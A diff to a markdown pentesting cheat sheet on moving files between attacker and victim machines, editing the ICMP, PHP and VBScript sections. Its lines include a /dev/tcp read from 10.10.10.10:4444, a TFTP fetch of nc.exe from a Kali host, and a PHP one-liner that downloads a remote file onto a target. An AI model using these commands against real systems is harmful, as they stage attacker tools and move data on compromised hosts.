@@ -169,8 +169,6 @@ exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
 
-thanks to **@BinaryShadow\_**
-
 ## **ICMP**
 
 ```bash
@@ -227,16 +225,18 @@ tftp -i <KALI-IP> get nc.exe
 
 ## PHP
 
-Download a file with a PHP oneliner:
+Download a file with a PHP one line:
 
 ```bash
-echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
+echo "<?php file_put_contents('nameOfFile', fopen('http://URL/file', 'r')); ?>" > file.php
 ```
 
 ## VBScript
 
+**Attacker**
+
 ```bash
-Attacker> python -m SimpleHTTPServer 80
+python -m SimpleHTTPServer 80
 ```
 
 #### Victim
